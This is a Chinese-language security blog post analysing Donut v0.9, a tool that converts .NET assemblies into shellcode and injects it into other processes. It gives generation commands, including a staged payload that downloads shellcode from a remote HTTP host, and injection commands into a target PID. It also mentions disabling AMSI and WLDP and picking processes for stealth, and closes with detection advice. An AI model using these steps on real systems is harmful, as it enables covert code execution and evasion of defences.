---
layout: post
title: Shellcode生成工具Donut测试分析
---


## 0x00 前言
---

Donut是一个shellcode生成工具，可以将.NET程序集转换为shellcode。这是对execute-assembly的进一步利用，隐蔽性更高，可扩展性更强。

结合byt3bl33d3r的[SILENTTRINITY](https://github.com/byt3bl33d3r/SILENTTRINITY)，将其转换为shellcode并进行注入，适用性更广。

本文将会对Donut进行测试，逐个分析Donut工程中的代码，总结这个工具的特点。

**注：**

本文测试的版本使用的是Donut v0.9，新版本将会添加更多的功能，值得持续关注

Donut地址：

https://github.com/TheWover/donut

介绍Donut细节的文章：

https://thewover.github.io/Introducing-Donut/

https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/

https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/

## 0x01 简介
---

本文将要介绍以下内容：

- 相关技术介绍
- 源码结构
- 实际测试
- 利用分析

## 0x02 相关技术介绍
---

### 1.Assembly.Load

用于在当前进程中加载.NET程序集，无法注入其他进程

.NET程序集的测试代码：

```
namespace ConsoleApplication1
{
    public class Program
    {
        public static void test()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";  
            p.Start();
        }
        static void Main(string[] args)
        {
            test();
        }   
    }
}
```

加载这个.NET程序集的时候会弹出计算器，用作验证功能

#### (1)Powershell实现Assembly.Load

```
$bytes = [System.IO.File]::ReadAllBytes("ConsoleApplication1.exe")
[Reflection.Assembly]::Load($bytes)
[ConsoleApplication1.Program]::test()
```

**注：**

可参考之前的文章[《利用Assembly Load & LoadFile绕过Applocker的分析总结》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/)

#### (2)C#实现Assembly.Load

https://github.com/anthemtotheego/SharpCradle

代码实现了从远程服务器下载.NET程序集并通过Assembly.Load进行加载

### 2.execute-assembly

从内存中加载.NET程序集，能够以dll的形式注入到其他进程中

**注：**

可参考之前的文章[《从内存加载.NET程序集(execute-assembly)的利用分析》](https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)

整个过程在内存执行，不写入文件系统(此时注入dll需要使用Dll反射)

Payload以dll形式存在，不会产生可疑的进程

**注：**

如果使用Loadlibrary加载dll，dll必须写入文件系统

### 3.Donut

基于execute-assembly，以shellcode的形式实现从内存中加载.NET程序集

优点是注入到其他进程时不再依赖于Dll反射，更隐蔽，更易于扩展

更隐蔽是指注入其他进程时不会存在dll

更易于扩展是指能够执行shellcode的方法都可以使用Donut，基于Donut的二次开发也很容易

## 0x03 源码结构
---

针对0.9版本的文件

### 1、子项目

#### 1.DemoCreateProcess

https://github.com/TheWover/donut/tree/master/DemoCreateProcess

c#程序，编译后生成文件ClassLibrary.dll，功能为将传入的两个参数作为启动进程

可通过Donut将其转换成shellcode，用作测试Donut生成shellcode的功能是否有效

#### 2.DonutTest

https://github.com/TheWover/donut/tree/master/DonutTest

c#程序，编译后生成文件DonutTest.exe，用于向指定pid的进程注入shellcode

实现细节：

数组中保存base64加密后的shellcode，解密后通过CreateRemoteThread注入到指定进程

#### 3.rundotnet.cpp

https://github.com/TheWover/donut/blob/master/DonutTest/rundotnet.cpp

c程序，编译后的文件为rundotnet.exe，用于读取指定文件并使用CLR从内存加载.NET程序集

从内存加载.NET程序集使用的方法：

- 使用当前系统中最新版本的.Net
- 使用ICorRuntimeHost接口
- 使用Load_3(...)从内存中读取并加载.NET程序集的Main方法

#### 4.ModuleMonitor

https://github.com/TheWover/donut/tree/master/ModuleMonitor

使用WMI事件Win32_ModuleLoadTrace来监视模块加载，如果发现CLR注入，将会标记

WMI事件Win32_ModuleLoadTrace：

https://docs.microsoft.com/en-us/previous-versions/windows/desktop/krnlprov/win32-moduleloadtrace

程序中判断CLR注入的方法：

如果进程加载了CLR，但程序不是.NET程序集，则CLR已注入其中

程序中判断进程加载CLR的方法：

进程是否加载了与CLR相关的dll(mscoree.dll,mscoreei.dll和mscorlib.dll)，dll以"msco"开头

这个工程一般是作防御检测用，用来检测系统是否产生了CLR注入事件，所以在启动后进程会一直执行，实时记录系统加载新模块的事件

这个地方使用tasklist.exe也能实现类似的功能，命令如下：

```
tasklist /m msco*
```

能够获得哪些进程调用了以"msco"开头的dll

#### 5.ProcessManager

https://github.com/TheWover/donut/tree/master/ProcessManager

用于枚举当前计算机或远程计算机上的进程

同tasklist.exe的功能类似，增加以下功能：

- 判断进程权限
- 判断进程位数(32位还是64位)
- 判断进程是否加载CLR

### 2、组件

#### 1.https://github.com/TheWover/donut/blob/master/payload/payload.c

Donut的关键功能，实现以下操作：

(1)获得shellcode并解密

提供两种方式：

- 从payload.h读取shellcode和解密密钥
- 从HTTP服务器下载shellcode和解密密钥

(2)使用CLR从内存加载.NET程序集

- 调用ICLRMetaHost::GetRuntime方法获取ICLRRuntimeInfo指针
- 使用ICorRuntimeHost接口
- 尝试关闭AMSI和WLDP
- 使用Load_3(...)从内存中读取

**注：**

介绍关闭AMSI和WLDP的细节：

https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/

值得注意的地方：

通常情况下，使用ICorRuntimeHost接口时需要调用mscorlib.tlb

这里并没有使用mscorlib.tlb，是通过手动定义的方式实现

更多细节可参考：

https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/

#### 2.https://github.com/TheWover/donut/tree/master/payload/exe2h

用来将exe转换为shellcode并保存到数组中

从payload.exe中的.text段中提取已编译的机器码(包括dll和解密密钥)，将其作为数组保存到payload_exe_x64.h或payload_exe_x86.h

#### 3.https://github.com/TheWover/donut/blob/master/payload/payload_exe_x64.h

存储64位的机器码(包括dll和解密密钥)

#### 4.https://github.com/TheWover/donut/blob/master/payload/payload_exe_x86.h

存储32位的机器码(包括dll和解密密钥)

#### 5.https://github.com/TheWover/donut/blob/master/payload/inject.c

使用RtlCreateUserThread向指定进程注入shellcode

可用作测试向指定进程注入shellcode的功能

#### 6.https://github.com/TheWover/donut/blob/master/payload/runsc.c

C/S架构，两个功能，可以发送和接收shellcode并执行

用于测试payload.bin的功能

#### 7.https://github.com/TheWover/donut/blob/master/encrypt.c

对称加密的实现

#### 8.https://github.com/TheWover/donut/blob/master/hash.c

API Hashing，这里使用了Maru hash

#### 9.https://github.com/TheWover/donut/blob/master/donut.c

主程序，用于将.NET程序集转换成shellcode

## 0x04 实际测试
---

### 1、选择测试dll

这里使用子项目DemoCreateProcess

编译后生成文件ClassLibrary.dll

### 2、使用Donut生成shellcode

64位：

```
donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
```

32位：

```
donut.exe -a 1 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
```

命令执行后生成文件payload.bin

如果加了-u指定URL，会再生成一个随机名称的Module文件，实例如下：

```
donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://192.168.1.1
```

生成文件payload.bin和YX63F37T

将YX63F37T上传到http://192.168.1.1

接下来通过注入shellcode的方式执行payload.bin，payload.bin会从http://192.168.1.1/YX63F37T下载实际的shellcode并执行

### 3、查看进程信息

这里使用子项目ProcessManager

列出进程后，Managed选项如果为True，代表该进程已经加载CLR

ProcessManager支持对指定进程进行筛选，例如只查看notepad.exe的进行信息，命令如下：

```
ProcessManager.exe --name notepad
```

### 4、注入shellcode

假设目标进程为3306

#### (1)使用子项目DonutTest

将payload.bin作base64编码并保存在剪贴板，powershell命令如下：

```
$filename = "payload.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```

替换DonutTest工程中对应的变量，编译成功后执行如下命令：

```
DonutTest.exe 3306
```

#### (2)使用RtlCreateUserThread

https://github.com/TheWover/donut/blob/master/payload/inject.c

命令如下：

```
inject.exe 3306 payload.bin
```

### 5、检测

列出加载了CLR但不是.NET程序集的进程，命令如下：

```
tasklist /m msco*
```

## 0x05 利用分析
---

Donut能够将.NET程序集转换为shellcode

也就是说，使用C#开发的程序都能通过Donut转换成shellcode

就目前的趋势来说，C#开源的工具越来越多，例如：

- https://github.com/GhostPack/SharpWMI
- https://github.com/checkymander/Sharp-WMIExec
- https://github.com/jnqpblc/SharpTask

在渗透测试中，C#将会逐步替代Powershell，Donut的利用也会是一个趋势

Donut的利用思路：

1. 将.NET程序集转换为shellcode，例如配合SILENTTRINITY使用
2. 作为模块集成到其他工具中
3. 扩展功能：支持类似meterpreter的migrate功能

为了更为隐蔽，可以先使用ProcessManager列举已经加载CLR的进程，对其进行注入

Donut的检测：

Donut需要使用CLR从内存中加载.NET程序集，可采取以下方法进行检测：

- 进程不是.NET程序集
- 进程加载了与CLR相关的dll(dll以"msco"开头)

**注：**

正常程序也有可能存在这个行为

两种检测方法：

- 使用命令`tasklist /m msco*`
- 使用WMI事件Win32_ModuleLoadTrace来监视模块加载

对满足以上条件的进程重点监控

## 0x06 小结
---

本文对Donut进行了测试分析，总结利用思路，给出防御建议。Donut值得深入研究，期待Donut的新版本



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






